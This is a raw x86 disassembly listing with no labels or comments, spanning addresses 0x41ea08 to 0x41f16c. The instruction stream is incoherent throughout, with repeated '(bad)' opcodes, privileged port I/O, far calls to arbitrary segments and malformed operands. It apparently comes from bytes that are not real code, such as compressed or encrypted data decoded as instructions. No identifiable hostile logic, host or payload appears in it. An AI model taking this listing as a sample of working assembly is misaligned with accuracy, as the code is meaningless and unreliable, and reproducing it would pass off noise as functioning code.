  41ea08:	sbb    edi,DWORD PTR [eax+0x3f]
  41ea0b:	dec    edi
  41ea0c:	or     al,0x3d
  41ea0e:	inc    edx
  41ea0f:	jp     0x41ea89
  41ea11:	mov    ds:0x308b2bd8,al
  41ea16:	(bad)  
  41ea18:	clc    
  41ea19:	(bad)  
  41ea1a:	mov    esp,0x4dea0c90
  41ea1f:	inc    BYTE PTR [ebx+ebp*4+0x3ecff046]
  41ea26:	pusha  
  41ea27:	xchg   ebp,eax
  41ea28:	sub    al,0x21
  41ea2a:	jnp    0x41e9be
  41ea2c:	int    0x6d
  41ea2e:	cli    
  41ea2f:	sub    dl,BYTE PTR [edi-0x1e0e9ffd]
  41ea35:	out    dx,eax
  41ea36:	pop    edx
  41ea37:	call   0xae12:0x7ef96473
  41ea3e:	adc    eax,0x9007ad17
  41ea43:	push   0x364978
  41ea48:	push   es
  41ea49:	xor    BYTE PTR ds:0xf56506de,cl
  41ea4f:	out    dx,al
  41ea50:	xchg   ecx,eax
  41ea51:	inc    ebp
  41ea52:	fdiv   DWORD PTR [ebp-0x5d8b9667]
  41ea58:	enter  0x2ecf,0xa3
  41ea5c:	adc    eax,0xcd57bb21
  41ea61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea62:	push   cs
  41ea63:	or     ax,0x6a3a
  41ea67:	icebp  
  41ea68:	adc    DWORD PTR [eax+0x575d8883],edi
  41ea6e:	ins    DWORD PTR es:[edi],dx
  41ea6f:	inc    esp
  41ea70:	ror    BYTE PTR ds:0x5e27156f,cl
  41ea76:	jle    0x41ea49
  41ea78:	int3   
  41ea79:	xchg   esi,eax
  41ea7a:	mov    bl,0x4f
  41ea7c:	jne    0x41ead8
  41ea7e:	rcl    DWORD PTR [ebp-0xc],1
  41ea81:	or     BYTE PTR [edi+0x5f],al
  41ea84:	pop    ecx
  41ea85:	mov    al,0x1
  41ea88:	scas   al,BYTE PTR es:[edi]
  41ea89:	ins    BYTE PTR es:[edi],dx
  41ea8a:	or     al,BYTE PTR [ebx]
  41ea8c:	add    DWORD PTR [ebx],esi
  41ea8e:	call   0xd6322515
  41ea93:	in     al,0x14
  41ea95:	mov    WORD PTR [ecx],gs
  41ea97:	shr    BYTE PTR [edx],0x10
  41ea9a:	lahf   
  41ea9b:	mov    dl,0x96
  41ea9d:	pop    ecx
  41ea9e:	(bad)  
  41eaa0:	and    ecx,edi
  41eaa2:	and    ebp,DWORD PTR [eax-0x6918b0db]
  41eaa8:	in     eax,0x18
  41eaaa:	retf   0xb8fd
  41eaad:	mov    ebp,0x1902ba87
  41eab2:	push   esp
  41eab3:	daa    
  41eab4:	jmp    0xf8f88cc4
  41eab9:	inc    esp
  41eaba:	fsubr  DWORD PTR [esi]
  41eabc:	call   0x16925b75
  41eac1:	retf   
  41eac2:	dec    ecx
  41eac3:	call   0x114e51ec
  41eac8:	cs pop es
  41eaca:	js     0x41ea54
  41eacc:	cmp    ebx,edi
  41eace:	fwait
  41eacf:	and    ch,BYTE PTR [ecx-0x7d9d4131]
  41ead5:	ins    DWORD PTR es:[edi],dx
  41ead6:	cmc    
  41ead7:	sub    esi,ecx
  41ead9:	push   0xb70ce69f
  41eade:	ins    BYTE PTR es:[edi],dx
  41eadf:	sub    DWORD PTR [edx-0x2a],esp
  41eae2:	adc    ecx,ecx
  41eae4:	cmp    eax,0x899ecaed
  41eae9:	xchg   edi,eax
  41eaea:	push   ss
  41eaeb:	sahf   
  41eaec:	ds dec eax
  41eaee:	fcmovne st,st(4)
  41eaf0:	jge    0x41eaf0
  41eaf2:	cdq    
  41eaf3:	mov    ah,BYTE PTR [esi]
  41eaf5:	call   0x9b72:0x57f732a3
  41eafc:	xchg   ebp,eax
  41eafd:	mov    dh,0x66
  41eaff:	add    eax,0xd1100bca
  41eb04:	adc    DWORD PTR [esi],esp
  41eb06:	cwde   
  41eb07:	mov    esp,0x5b87de16
  41eb0c:	push   esp
  41eb0d:	mov    esi,0xe9c19a54
  41eb12:	std    
  41eb13:	idiv   DWORD PTR [eax-0x3d]
  41eb16:	fimul  WORD PTR [esi+0x5]
  41eb19:	push   ecx
  41eb1a:	mov    ds:0xae62d7bc,al
  41eb1f:	lds    ebp,FWORD PTR [ebp+0x56e2297d]
  41eb25:	jbe    0x41eb86
  41eb27:	out    0x68,eax
  41eb29:	jl     0x41eba8
  41eb2b:	jbe    0x41eb39
  41eb2d:	xor    eax,0x10826d34
  41eb32:	mov    esp,0x1d99869c
  41eb37:	inc    esp
  41eb38:	push   ebp
  41eb39:	out    dx,al
  41eb3a:	or     ebx,DWORD PTR [ebp+ebp*4+0x35cb43c4]
  41eb41:	mov    dl,0x64
  41eb43:	xlat   BYTE PTR ds:[ebx]
  41eb44:	clc    
  41eb45:	bound  eax,QWORD PTR [ebx]
  41eb47:	xchg   ebx,edi
  41eb49:	mov    bh,BYTE PTR [esi+0x45260353]
  41eb4f:	xchg   esi,eax
  41eb50:	es sub al,dh
  41eb53:	cmp    al,0x5f
  41eb55:	add    DWORD PTR [edi+esi*4+0x48f82f11],0xce1000fe
  41eb60:	aaa    
  41eb61:	adc    al,0x37
  41eb63:	ins    DWORD PTR es:[edi],dx
  41eb64:	leave  
  41eb65:	in     eax,dx
  41eb66:	or     cl,bl
  41eb68:	pusha  
  41eb69:	inc    ecx
  41eb6a:	push   edi
  41eb6b:	in     al,dx
  41eb6c:	dec    esi
  41eb6d:	xor    esi,0x26
  41eb70:	mov    ebp,0xe5368199
  41eb75:	adc    al,0x21
  41eb77:	mov    bh,0x14
  41eb79:	jno    0x41eb40
  41eb7b:	pop    edx
  41eb7c:	mov    dl,0x1a
  41eb7e:	outs   dx,DWORD PTR ds:[esi]
  41eb7f:	neg    bh
  41eb81:	retf   0xa89a
  41eb84:	fadd   DWORD PTR [edi-0x4ac5fe53]
  41eb8a:	rcl    BYTE PTR [esi+eax*8+0x36d00fa7],1
  41eb91:	lods   eax,DWORD PTR ds:[esi]
  41eb92:	dec    ebp
  41eb93:	xchg   edx,eax
  41eb94:	outs   dx,DWORD PTR ds:[esi]
  41eb95:	cli    
  41eb96:	xchg   esi,eax
  41eb97:	pop    ecx
  41eb98:	push   esp
  41eb99:	fmul   DWORD PTR [ebp-0x47]
  41eb9c:	cmp    BYTE PTR [edx*8-0x200ef228],dl
  41eba3:	mov    al,BYTE PTR [edx]
  41eba5:	xor    eax,0x650a86ba
  41ebaa:	imul   BYTE PTR [edi-0x48]
  41ebad:	jbe    0x41ebd6
  41ebaf:	dec    eax
  41ebb0:	inc    edi
  41ebb1:	mov    es,WORD PTR [ecx+0x5370e4e]
  41ebb7:	xor    DWORD PTR [eax-0xdb64aaa],esi
  41ebbd:	mov    ds:0xb875d453,eax
  41ebc2:	jbe    0x41ec28
  41ebc4:	mov    ds:0x743dd4b9,eax
  41ebc9:	mov    DWORD PTR [ecx],edi
  41ebcb:	mov    ds:0x23ad9a88,al
  41ebd0:	int    0x65
  41ebd2:	retf   
  41ebd3:	sbb    edx,esp
  41ebd5:	fsub   QWORD PTR [esp+edi*2-0x5a4a66d4]
  41ebdc:	rcr    DWORD PTR [esi+0xd],cl
  41ebdf:	xchg   edx,eax
  41ebe0:	or     bl,BYTE PTR [edx+edi*2+0x1]
  41ebe4:	out    dx,al
  41ebe5:	sbb    BYTE PTR [edi+ebp*1+0x66487546],0x66
  41ebed:	and    eax,0xf7d548d6
  41ebf2:	xor    dh,ch
  41ebf4:	xchg   edx,eax
  41ebf5:	pop    esi
  41ebf6:	scas   al,BYTE PTR es:[edi]
  41ebf7:	sub    edi,edx
  41ebf9:	aaa    
  41ebfa:	ror    DWORD PTR [esi+0x45f04aa1],1
  41ec00:	push   ecx
  41ec01:	xor    BYTE PTR [ebx],ah
  41ec03:	jnp    0x41ebfd
  41ec05:	mov    ecx,0xe5ac69fb
  41ec0a:	sbb    BYTE PTR [ebx],0x73
  41ec0d:	cmc    
  41ec0e:	add    eax,DWORD PTR [edx]
  41ec10:	and    bl,BYTE PTR [esi+0x62726ba0]
  41ec16:	push   ebp
  41ec17:	push   ebp
  41ec18:	sbb    ah,cl
  41ec1a:	std    
  41ec1b:	mov    bh,0xf7
  41ec1d:	xor    dh,BYTE PTR [esi+ecx*8-0x4e68d63e]
  41ec24:	pop    esp
  41ec25:	or     ebp,DWORD PTR [edi-0x8]
  41ec28:	arpl   WORD PTR [eax+0x163fcfb4],sp
  41ec2e:	mov    dl,0xc9
  41ec30:	into   
  41ec31:	in     al,dx
  41ec32:	imul   eax,DWORD PTR [ebp+0x5cda32e2],0x1f2949ad
  41ec3c:	(bad)
  41ec3f:	pop    es
  41ec40:	fdiv   QWORD PTR [ebx-0xb]
  41ec43:	xor    esp,DWORD PTR [ebx-0x7f]
  41ec46:	jnp    0x41ec80
  41ec48:	jp     0x41ec1f
  41ec4a:	mov    al,0xc2
  41ec4c:	lahf   
  41ec4d:	and    DWORD PTR [eax],ecx
  41ec4f:	push   ebp
  41ec50:	dec    eax
  41ec51:	push   ss
  41ec52:	aas    
  41ec53:	movhps xmm4,QWORD PTR [edx-0x709e14e1]
  41ec5a:	inc    esi
  41ec5b:	sub    cl,BYTE PTR [esi+ebx*8+0x3d]
  41ec5f:	add    DWORD PTR [edx],esi
  41ec61:	pop    ebp
  41ec62:	test   eax,0x852a36fa
  41ec67:	xchg   ebx,eax
  41ec68:	aas    
  41ec69:	fnstenv [ebp-0x3a8c7615]
  41ec6f:	ins    BYTE PTR es:[edi],dx
  41ec70:	inc    esi
  41ec71:	push   ebp
  41ec72:	icebp  
  41ec73:	adc    dh,BYTE PTR [ecx]
  41ec75:	frstor [edi+0x56e012ab]
  41ec7b:	sub    dh,BYTE PTR [esi-0x2d]
  41ec7e:	das    
  41ec7f:	adc    eax,0xb9eb2ca4
  41ec84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ec85:	lea    edx,[ebx-0x29]
  41ec88:	push   0xaa7268f5
  41ec8d:	das    
  41ec8e:	push   eax
  41ec8f:	inc    esp
  41ec90:	xor    cl,BYTE PTR [eax-0x584300c8]
  41ec96:	sub    al,0xbe
  41ec98:	mov    bh,0x4d
  41ec9a:	loope  0x41ec34
  41ec9c:	outs   dx,DWORD PTR ds:[esi]
  41ec9d:	mov    ch,0x5a
  41ec9f:	js     0x41ec95
  41eca1:	sub    eax,0xc376cf6b
  41eca6:	mul    esp
  41eca8:	retf   0xade
  41ecab:	add    DWORD PTR [ebp+0x6b34b6e7],ecx
  41ecb1:	xchg   esp,eax
  41ecb2:	test   BYTE PTR ds:0x6a63ddf9,cl
  41ecb8:	mov    ds:0x12ba65d8,eax
  41ecbd:	add    bh,0xf1
  41ecc0:	or     edx,DWORD PTR [eax-0x2]
  41ecc3:	adc    BYTE PTR [esp+esi*8+0x263ebe5d],cl
  41ecca:	sub    BYTE PTR ds:0xaf875238,dh
  41ecd0:	in     eax,dx
  41ecd1:	inc    edi
  41ecd2:	out    dx,al
  41ecd3:	cld    
  41ecd4:	jnp    0x41ecf3
  41ecd6:	sbb    ah,BYTE PTR [eax+0x21]
  41ecd9:	jle    0x41ec63
  41ecdb:	push   ebp
  41ecdc:	jecxz  0x41ed33
  41ecde:	jb     0x41ecef
  41ece0:	cli    
  41ece1:	test   al,0x18
  41ece3:	sbb    DWORD PTR [esi],esp
  41ece5:	sub    al,0x8f
  41ece7:	xor    BYTE PTR [ecx-0xc9c9263],ah
  41eced:	mov    ah,0xd4
  41ecef:	clc    
  41ecf0:	sahf   
  41ecf1:	ficomp DWORD PTR [edi]
  41ecf3:	xor    DWORD PTR [edi-0x7c],ebx
  41ecf6:	xchg   ebx,eax
  41ecf7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ecf8:	mov    edx,0xf637f869
  41ecfd:	and    edi,DWORD PTR [ebx+edx*2]
  41ed00:	shl    BYTE PTR [ebp+0x4dbedbd8],cl
  41ed06:	in     eax,dx
  41ed07:	jns    0x41ed6e
  41ed09:	adc    eax,0xf91bc0be
  41ed0e:	(bad)  
  41ed10:	jne    0xf10fae6a
  41ed16:	in     eax,dx
  41ed17:	mov    ds:0x5bc38fbb,eax
  41ed1c:	repnz ins DWORD PTR es:[edi],dx
  41ed1e:	out    0x64,eax
  41ed20:	and    esp,ebp
  41ed22:	mov    al,ds:0x1cae870d
  41ed27:	out    dx,al
  41ed28:	inc    esi
  41ed29:	aas    
  41ed2a:	int3   
  41ed2b:	inc    edi
  41ed2c:	cwde   
  41ed2d:	mov    ds:0x98cee2db,eax
  41ed32:	shl    DWORD PTR [ecx-0x4],cl
  41ed35:	jns    0x41ed93
  41ed37:	jnp    0x41eda4
  41ed39:	out    0x7f,eax
  41ed3b:	mov    eax,ds:0x19a25589
  41ed40:	addr16 fucomip st,st(7)
  41ed43:	fcmovnbe st,st(7)
  41ed45:	add    al,0xb7
  41ed47:	out    0x1e,eax
  41ed49:	xchg   edi,eax
  41ed4a:	cmc    
  41ed4b:	pop    ss
  41ed4c:	test   al,0x5
  41ed4e:	aaa    
  41ed4f:	mov    WORD PTR [ecx+0x47],?
  41ed52:	out    0xfc,eax
  41ed54:	in     eax,dx
  41ed55:	push   esi
  41ed56:	add    al,BYTE PTR [edi+0x40992c08]
  41ed5c:	cli    
  41ed5d:	pop    ds
  41ed5e:	fs mov edi,tr4
  41ed62:	or     esp,DWORD PTR [eax]
  41ed64:	cmp    ebp,esi
  41ed66:	(bad)  
  41ed67:	mov    ecx,0xa6a4dbd3
  41ed6c:	mov    bl,0xc7
  41ed6e:	jbe    0x41edd3
  41ed70:	cmp    DWORD PTR [edx+0x79],ebx
  41ed73:	adc    al,0x91
  41ed75:	add    eax,0x26f69dfb
  41ed7a:	xor    esi,esi
  41ed7c:	dec    ebp
  41ed7d:	sub    ebp,DWORD PTR [eax]
  41ed7f:	push   0x12
  41ed81:	pop    esi
  41ed82:	pop    esp
  41ed83:	fwait
  41ed84:	sbb    al,0xc6
  41ed86:	pop    edi
  41ed87:	inc    edi
  41ed88:	fwait
  41ed89:	(bad)
  41ed8c:	sub    eax,0xedd03484
  41ed91:	int3   
  41ed92:	mov    cs,WORD PTR [ecx+0x5e]
  41ed95:	jae    0x41ed4f
  41ed97:	jg     0x41ed4d
  41ed99:	mov    WORD PTR [edi],cs
  41ed9b:	sub    eax,0x7706b4e8
  41eda0:	cmp    DWORD PTR [edx-0x3c8ed4e1],ecx
  41eda6:	inc    ebx
  41eda7:	pop    es
  41eda8:	adc    DWORD PTR [esp+eiz*2],0xc
  41edac:	fwait
  41edad:	and    esp,DWORD PTR [edi+0xa]
  41edb0:	test   ecx,0xc5047e25
  41edb6:	fst    st(3)
  41edb8:	cwde   
  41edb9:	rol    DWORD PTR [ebx+0xb],cl
  41edbc:	dec    ebp
  41edbd:	leave  
  41edbe:	pop    ecx
  41edbf:	bound  ebx,QWORD PTR [edx+0x0]
  41edc2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41edc3:	sahf   
  41edc4:	cld    
  41edc5:	dec    ebx
  41edc6:	mov    bl,0x53
  41edc8:	adc    eax,0x448a9c0f
  41edcd:	inc    eax
  41edce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41edcf:	lahf   
  41edd0:	push   cs
  41edd1:	jbe    0x41ed7f
  41edd3:	mov    ebp,0x57a8d28b
  41edd8:	or     DWORD PTR [ecx],esp
  41edda:	or     esi,eax
  41eddc:	inc    esp
  41eddd:	mov    DWORD PTR [ecx],esi
  41eddf:	cmc    
  41ede0:	in     eax,dx
  41ede1:	mov    ch,0xec
  41ede3:	push   eax
  41ede4:	retf   0x75e9
  41ede7:	test   BYTE PTR [esp+eax*1+0x74331ec4],ah
  41edee:	sbb    eax,0x47577298
  41edf3:	repz xchg edx,eax
  41edf5:	pushf  
  41edf6:	aam    0xfe
  41edf8:	int    0x6e
  41edfa:	jae    0x41ee45
  41edfc:	push   esi
  41edfd:	lahf   
  41edfe:	sbb    ebp,DWORD PTR [ecx+esi*8]
  41ee01:	sub    DWORD PTR [ebx-0x5b],eax
  41ee04:	pushf  
  41ee05:	xor    DWORD PTR [eax+0x632bc9c4],ecx
  41ee0b:	sti    
  41ee0c:	lods   ax,WORD PTR ds:[esi]
  41ee0e:	out    0x81,al
  41ee10:	inc    ecx
  41ee11:	addr16 ja 0x41edbc
  41ee14:	sbb    BYTE PTR [edx],dh
  41ee16:	stos   BYTE PTR es:[edi],al
  41ee17:	lods   eax,DWORD PTR ds:[esi]
  41ee18:	nop
  41ee19:	pushf  
  41ee1a:	mov    bl,0xf0
  41ee1c:	xchg   DWORD PTR [edi-0x42bd2819],ebx
  41ee22:	inc    eax
  41ee23:	push   edi
  41ee24:	adc    eax,0xa62f47ae
  41ee29:	adc    BYTE PTR [edi-0x6c],0x19
  41ee2d:	inc    edx
  41ee2e:	pusha  
  41ee2f:	jbe    0x41ee10
  41ee31:	cdq    
  41ee32:	aam    0x8f
  41ee34:	mov    ebx,DWORD PTR [ebx]
  41ee36:	test   ebp,edi
  41ee38:	inc    esp
  41ee39:	mov    WORD PTR [eax+edi*8+0x7a],es
  41ee3d:	inc    esp
  41ee3e:	mov    dl,BYTE PTR [edx]
  41ee40:	leave  
  41ee41:	stos   BYTE PTR es:[edi],al
  41ee42:	or     edi,ebx
  41ee44:	jnp    0x41eeba
  41ee46:	or     al,0xd8
  41ee48:	sahf   
  41ee49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee4a:	retf   
  41ee4b:	inc    ebp
  41ee4c:	and    al,BYTE PTR es:[esi+0x2e]
  41ee50:	dec    eax
  41ee51:	push   ecx
  41ee52:	int    0xb3
  41ee54:	mov    ds:0xeac65071,al
  41ee59:	or     bh,bh
  41ee5b:	mov    bl,ch
  41ee5d:	shl    BYTE PTR [edi-0x345126d6],1
  41ee63:	cld    
  41ee64:	dec    ebp
  41ee65:	ins    BYTE PTR es:[edi],dx
  41ee66:	push   eax
  41ee67:	pop    ecx
  41ee68:	out    0x2a,eax
  41ee6a:	ficomp WORD PTR [eax]
  41ee6c:	sti    
  41ee6d:	push   edi
  41ee6e:	call   0x9bf:0xb48a9ea
  41ee75:	jno    0x41eea8
  41ee77:	mov    eax,ds:0x78c21040
  41ee7c:	sub    DWORD PTR [edi+0x4aba8b5a],edx
  41ee82:	mov    esp,0x781b8ccc
  41ee87:	ins    DWORD PTR es:[edi],dx
  41ee88:	jno    0x41ee2e
  41ee8a:	push   0xfb3000a1
  41ee8f:	pop    ss
  41ee90:	mov    al,ds:0x8282d7da
  41ee95:	cdq    
  41ee96:	xchg   DWORD PTR [esi+0x31],ebx
  41ee99:	jmp    0x76d5:0xc4546579
  41eea0:	rcl    ebp,cl
  41eea2:	xchg   ebp,eax
  41eea3:	adc    esi,DWORD PTR [edx-0x5f6d2911]
  41eea9:	sub    esp,ecx
  41eeab:	mov    edi,DWORD PTR [edx]
  41eead:	dec    esi
  41eeae:	cmp    bl,BYTE PTR ds:[esi-0x76]
  41eeb2:	imul   ebx,DWORD PTR [ebx-0x7e247bb0],0xffffffdd
  41eeb9:	or     DWORD PTR [ebx],ebp
  41eebb:	rcr    cl,0x49
  41eebe:	in     eax,0x4f
  41eec0:	int3   
  41eec1:	aad    0x24
  41eec3:	xchg   BYTE PTR [edx-0x394403d3],al
  41eec9:	jl     0x41eec8
  41eecb:	sahf   
  41eecc:	pop    edx
  41eecd:	push   es
  41eece:	mov    ?,WORD PTR [edi-0x54c4900a]
  41eed4:	and    ebp,DWORD PTR [ebx-0xc343ed8]
  41eeda:	test   eax,0x700e6ca8
  41eedf:	push   0xa387c7b2
  41eee4:	and    al,BYTE PTR [eiz*1-0x6ecf2f6d]
  41eeeb:	iret   
  41eeec:	jmp    0x41ef23
  41eeee:	fcomp  st(7)
  41eef0:	push   cs
  41eef1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eef2:	xor    edx,DWORD PTR [eax+0x2b]
  41eef5:	add    DWORD PTR [edi+0x63],ebx
  41eef8:	mov    dh,0x57
  41eefa:	sbb    ebp,DWORD PTR [ebx-0x4539a615]
  41ef00:	outs   dx,BYTE PTR ds:[esi]
  41ef01:	xor    DWORD PTR [esi],esi
  41ef03:	push   ecx
  41ef04:	push   0x4
  41ef06:	inc    esp
  41ef07:	test   DWORD PTR [edi+0x59],ecx
  41ef0a:	data16 test al,0x1b
  41ef0d:	inc    eax
  41ef0e:	inc    edi
  41ef0f:	push   0xffffffe2
  41ef11:	jns    0x41ef3c
  41ef13:	test   al,0x59
  41ef15:	xor    DWORD PTR [ecx+ebp*2-0x6eab3362],ebx
  41ef1c:	popf   
  41ef1d:	iret   
  41ef1e:	mov    WORD PTR [edi-0x8],es
  41ef21:	xchg   edi,eax
  41ef22:	inc    edi
  41ef23:	enter  0x4edf,0x8e
  41ef27:	xchg   ebx,eax
  41ef28:	lds    ecx,FWORD PTR [edx+0x48]
  41ef2b:	rcr    ch,1
  41ef2d:	fsubr  QWORD PTR ds:0x3cf2d738
  41ef33:	sub    ch,BYTE PTR [eax]
  41ef35:	dec    edi
  41ef36:	mov    bl,0x90
  41ef38:	enter  0x109c,0xea
  41ef3c:	adc    bh,BYTE PTR [edx+ebp*8-0x22]
  41ef40:	mov    ecx,0xf7578c41
  41ef45:	cld    
  41ef46:	(bad)  
  41ef47:	test   eax,0x3e6e6c14
  41ef4c:	leave  
  41ef4d:	xor    eax,0xdc5bf08f
  41ef52:	cmp    BYTE PTR [esi],bh
  41ef54:	or     BYTE PTR [ecx-0x2],ch
  41ef57:	shr    DWORD PTR [ebp-0x9],1
  41ef5a:	sub    dl,BYTE PTR [esi+0x67097ae1]
  41ef60:	fnstenv [edi+ebp*4]
  41ef63:	xchg   ecx,eax
  41ef64:	sbb    DWORD PTR [edi-0x63b0dc3c],esp
  41ef6a:	mov    ch,0xe9
  41ef6c:	stc    
  41ef6d:	fcom   QWORD PTR [ebp-0x7b]
  41ef70:	or     BYTE PTR [ecx-0x665ea0a7],0xe6
  41ef77:	retf   
  41ef78:	test   al,0xd
  41ef7a:	sub    BYTE PTR [ebx+0x7ac45f5b],bh
  41ef80:	add    al,0xea
  41ef82:	rcl    eax,0xb3
  41ef85:	push   eax
  41ef86:	hlt    
  41ef87:	leave  
  41ef88:	gs js  0x41eff2
  41ef8b:	push   ds
  41ef8c:	ret    
  41ef8d:	push   esp
  41ef8e:	imul   ebx,DWORD PTR [ecx+0x121ab8dd],0x92ce06a6
  41ef98:	out    dx,al
  41ef99:	add    DWORD PTR [esi+0x132de914],0x25
  41efa0:	fimul  WORD PTR [edi+0x3cff5a6a]
  41efa6:	mov    dh,0x96
  41efa8:	fwait
  41efa9:	in     eax,dx
  41efaa:	pop    ds
  41efab:	das    
  41efac:	xor    eax,DWORD PTR [ebx]
  41efae:	or     dl,BYTE PTR [esi+0x1737a4ed]
  41efb4:	push   edx
  41efb5:	xlat   BYTE PTR ds:[ebx]
  41efb6:	lahf   
  41efb7:	push   ecx
  41efb8:	leave  
  41efb9:	adc    DWORD PTR [ebx-0x8ca94ea],0x4d
  41efc0:	jns    0x41f02a
  41efc2:	es cld 
  41efc4:	mov    ecx,0x519ba50a
  41efc9:	inc    esi
  41efca:	std    
  41efcb:	push   es
  41efcc:	dec    edi
  41efcd:	pop    esp
  41efce:	lock cld 
  41efd0:	ja     0x41effa
  41efd2:	jno    0x41f04a
  41efd4:	ds push es
  41efd6:	outs   dx,BYTE PTR ds:[esi]
  41efd7:	jbe    0x41ef73
  41efd9:	stc    
  41efda:	out    0xf4,al
  41efdc:	pushf  
  41efdd:	adc    al,0x14
  41efdf:	adc    esp,edx
  41efe1:	(bad)  [edx]
  41efe3:	loopne 0x41efa3
  41efe5:	adc    ah,BYTE PTR [ebx]
  41efe7:	in     al,0xe1
  41efe9:	pop    es
  41efea:	mov    eax,DWORD PTR [ecx+0x4815a645]
  41eff0:	jle    0x41ef83
  41eff2:	xor    DWORD PTR [ecx+ebx*1+0x1e293585],ecx
  41eff9:	ds ins BYTE PTR es:[edi],dx
  41effb:	mov    al,0x71
  41effd:	test   al,0x25
  41efff:	mov    DWORD PTR [ebx],edx
  41f001:	lock shr ecx,1
  41f004:	cld    
  41f005:	stos   BYTE PTR es:[edi],al
  41f006:	rcl    BYTE PTR [edi],cl
  41f008:	dec    esp
  41f009:	mov    al,ds:0x8f778ae6
  41f00e:	pop    ebx
  41f00f:	and    ah,BYTE PTR [esi+edx*8-0x587b747a]
  41f016:	sub    BYTE PTR [ebx-0x4e],bl
  41f019:	sub    ah,bh
  41f01b:	aaa    
  41f01c:	ja     0x41efa8
  41f01e:	xlat   BYTE PTR ds:[ebx]
  41f01f:	xor    al,dh
  41f021:	stc    
  41f022:	add    DWORD PTR [eax+0x5b658da4],ebp
  41f028:	xor    bh,BYTE PTR [ebp+0x79]
  41f02b:	int    0x28
  41f02d:	scas   eax,DWORD PTR es:[edi]
  41f02e:	xchg   ebx,eax
  41f02f:	call   0x1b7a65ff
  41f034:	xchg   edx,eax
  41f035:	scas   al,BYTE PTR es:[edi]
  41f036:	xchg   BYTE PTR ds:0x9535f7d7,ah
  41f03c:	dec    ebp
  41f03d:	stos   BYTE PTR es:[edi],al
  41f03e:	pop    edi
  41f03f:	repz retf 0x78c1
  41f043:	pop    ds
  41f044:	lods   eax,DWORD PTR ds:[esi]
  41f045:	or     cl,dl
  41f047:	push   0x28640aa8
  41f04c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f04d:	or     eax,0xc660dccf
  41f052:	jmp    0x4345fb44
  41f057:	cmp    ebx,ebx
  41f059:	sub    BYTE PTR [edi-0x7e80c0ca],bl
  41f05f:	iret   
  41f060:	cs push ebx
  41f062:	adc    DWORD PTR [ebp+0x5643a501],edx
  41f068:	ds pop ebp
  41f06a:	mov    al,0x97
  41f06c:	neg    ah
  41f06e:	daa    
  41f06f:	into   
  41f070:	and    bh,bh
  41f072:	ja     0x41f034
  41f074:	pop    ebx
  41f075:	push   esp
  41f076:	aad    0x49
  41f078:	popf   
  41f079:	sub    al,0xbf
  41f07b:	inc    ebx
  41f07c:	or     BYTE PTR [esi-0x9b7cef3],dl
  41f082:	(bad)  
  41f084:	retf   
  41f085:	aad    0x51
  41f087:	jno    0x41f020
  41f089:	push   cs
  41f08a:	jecxz  0x41f0bd
  41f08c:	push   edx
  41f08d:	xchg   ebp,eax
  41f08e:	mov    ebp,0xc74614eb
  41f093:	push   0xa199f222
  41f098:	mov    ecx,0xca44e390
  41f09d:	add    esi,edi
  41f09f:	pop    esi
  41f0a0:	int3   
  41f0a1:	in     eax,0xf4
  41f0a3:	ror    DWORD PTR [esp+ecx*2-0x42],1
  41f0a7:	mov    DWORD PTR [edx+0x14],edi
  41f0aa:	jl     0x41f035
  41f0ac:	fmul   QWORD PTR [ebp+0x56]
  41f0af:	(bad)  
  41f0b0:	call   0xe51434fa
  41f0b5:	jb     0x41f08e
  41f0b7:	xor    al,0xf8
  41f0b9:	inc    ecx
  41f0ba:	repnz div BYTE PTR [esi+esi*2+0x73]
  41f0bf:	lods   al,BYTE PTR ds:[esi]
  41f0c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f0c1:	sbb    BYTE PTR [ebx-0x75],bh
  41f0c4:	daa    
  41f0c5:	lds    esi,FWORD PTR [edx]
  41f0c7:	daa    
  41f0c8:	mov    eax,ds:0x219adc07
  41f0cd:	push   DWORD PTR [ebx-0x42]
  41f0d0:	mov    al,0xc4
  41f0d2:	popf   
  41f0d3:	sub    eax,0xb4931067
  41f0d8:	ret    
  41f0d9:	inc    ebp
  41f0da:	js     0x41f086
  41f0dc:	hlt    
  41f0dd:	and    ebp,DWORD PTR [esp+0x30118b03]
  41f0e4:	ret    
  41f0e5:	out    dx,eax
  41f0e6:	jne    0x41f0e3
  41f0e8:	cmp    edx,0x56
  41f0eb:	cmp    eax,0xb05e19d9
  41f0f0:	mov    ecx,0x6bd7a1d9
  41f0f5:	out    dx,eax
  41f0f6:	sbb    DWORD PTR [esi-0x26eeac39],ebx
  41f0fc:	push   0x21d2021d
  41f101:	mov    BYTE PTR [edx],al
  41f103:	sti    
  41f104:	test   DWORD PTR [ebx],0x48547cd4
  41f10a:	adc    bl,BYTE PTR [edi+0xf]
  41f10d:	pop    ebx
  41f10e:	(bad)  
  41f10f:	(bad)  ds:0xaf899a48
  41f115:	jno    0x41f09a
  41f117:	pop    ss
  41f118:	aad    0xb9
  41f11a:	cmc    
  41f11b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f11c:	xchg   edx,eax
  41f11d:	xchg   ebp,eax
  41f11e:	and    BYTE PTR [eax+0x4b],0x75
  41f122:	adc    eax,0xb317fe00
  41f127:	aam    0x30
  41f129:	jae    0x41f187
  41f12b:	test   al,0x22
  41f12d:	xchg   esp,eax
  41f12e:	push   ecx
  41f12f:	inc    eax
  41f130:	sub    ebp,eax
  41f132:	and    eax,0x4b477060
  41f137:	daa    
  41f138:	in     eax,0x85
  41f13a:	aaa    
  41f13b:	mov    esi,0x8855209a
  41f140:	dec    al
  41f142:	cmp    esp,eax
  41f144:	outs   dx,BYTE PTR ds:[esi]
  41f145:	call   0x37b2674c
  41f14a:	jns    0x41f167
  41f14c:	adc    BYTE PTR [eax-0x1c],dl
  41f14f:	mov    ecx,0x17da749f
  41f154:	pop    edi
  41f155:	jne    0x41f10d
  41f157:	dec    ebx
  41f158:	and    al,0x65
  41f15a:	(bad)  [edx+0x21cc5be5]
  41f160:	loopne 0x41f146
  41f162:	inc    edx
  41f163:	in     al,dx
  41f164:	mov    esp,0x5ff85687
  41f169:	bound  ebp,QWORD PTR [edx+0x50]
  41f16c:	sbb    BYTE PTR [ecx+0x391b9110],dl
